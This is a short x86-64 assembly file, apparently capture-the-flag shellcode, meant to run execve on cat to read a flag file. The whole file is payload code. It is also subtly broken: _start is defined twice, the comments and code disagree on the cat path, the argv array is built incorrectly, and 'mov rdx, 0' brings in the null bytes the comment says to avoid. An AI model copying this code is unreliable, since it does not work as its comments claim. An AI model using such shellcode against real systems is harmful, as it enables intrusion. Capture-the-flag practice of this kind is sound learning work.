; create shellcode to read /flag.txt
; /bin/cat /flag.txt

global _start

section .text
_start:
	; execve("/usr/bin/cat", ["/usr/bin/cat", "flag.txt"], NULL)
	; little endian -> 0x1234 is 0x4321
	; f(a,b,c) -> push c push b push a call f
	; cant have null bytes so just xor a register to clear it and push it

_start:
        xor rax, rax
        push rax

        mov rdi, 'flag.txt'
	push rdi

	mov rsi, rsp

	push rax

	mov r8, '/bin/cat'
	push r8

	mov rdi, rsp

	mov rdx, 0
	mov rax, 59
	syscall
